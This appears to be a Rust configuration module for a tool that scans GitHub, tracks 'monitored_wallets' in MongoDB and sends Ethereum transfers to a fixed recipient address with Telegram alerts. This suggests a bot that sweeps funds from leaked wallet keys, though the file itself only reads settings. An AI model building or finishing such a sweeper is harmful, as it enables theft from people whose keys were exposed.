use std::env;
use thiserror::Error;

#[derive(Debug, Clone)]
pub struct Config {
    pub github_token: Option<String>,
    pub github_api_url: String,
    pub telegram_bot_token: String,
    pub telegram_chat_id: String,
    pub mongodb_uri: String,
    pub mongodb_db: String,
    pub mongodb_collection: String,
    pub recipient_address: String,
    pub rpc_url: String,
    pub chain_id: u64,
    pub poll_interval_secs: u64,
    pub min_balance_threshold: f64,
    pub gas_limit: u64,
    pub gas_price_gwei: u64,
}

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("Missing required environment variable: {0}")]
    MissingEnv(String),
    
    #[error("Invalid value for environment variable {0}: {1}")]
    InvalidValue(String, String),
}

impl Config {
    pub fn from_env() -> Result<Self, ConfigError> {
        Ok(Self {
            github_token: env::var("GITHUB_TOKEN").ok(),
            
            github_api_url: env::var("GITHUB_API_URL")
                .unwrap_or_else(|_| "https://api.github.com".to_string()),
            
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN")
                .unwrap_or_default(),
            
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID")
                .unwrap_or_else(|_| "0".to_string()),
            
            mongodb_uri: env::var("MONGODB_URI")
                .unwrap_or_else(|_| "mongodb://localhost:27017".to_string()),
            
            mongodb_db: env::var("MONGODB_DB")
                .unwrap_or_else(|_| "git_scanner".to_string()),
            
            mongodb_collection: env::var("MONGODB_COLLECTION")
                .unwrap_or_else(|_| "monitored_wallets".to_string()),
            
            recipient_address: env::var("RECIPIENT_ADDRESS")
                .unwrap_or_default(),
            
            rpc_url: env::var("RPC_URL")
                .unwrap_or_else(|_| "https://eth-mainnet.g.alchemy.com/v2/demo".to_string()),
            
            chain_id: env::var("CHAIN_ID")
                .unwrap_or_else(|_| "1".to_string())
                .parse::<u64>()
                .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("CHAIN_ID".to_string(), e.to_string()))?,
            
            poll_interval_secs: env::var("POLL_INTERVAL_SECONDS")
                .unwrap_or_else(|_| "3".to_string())
                .parse::<u64>()
                .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("POLL_INTERVAL_SECONDS".to_string(), e.to_string()))?,
            
            min_balance_threshold: env::var("MIN_BALANCE_THRESHOLD")
                .unwrap_or_else(|_| "0.0001".to_string())
                .parse::<f64>()
                .map_err(|e: std::num::ParseFloatError| ConfigError::InvalidValue("MIN_BALANCE_THRESHOLD".to_string(), e.to_string()))?,
            
            gas_limit: env::var("GAS_LIMIT")
                .unwrap_or_else(|_| "21000".to_string())
                .parse::<u64>()
                .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("GAS_LIMIT".to_string(), e.to_string()))?,
            
            gas_price_gwei: env::var("GAS_PRICE_GWEI")
                .unwrap_or_else(|_| "50".to_string())
                .parse::<u64>()
                .map_err(|e: std::num::ParseIntError| ConfigError::InvalidValue("GAS_PRICE_GWEI".to_string(), e.to_string()))?,
        })
    }
}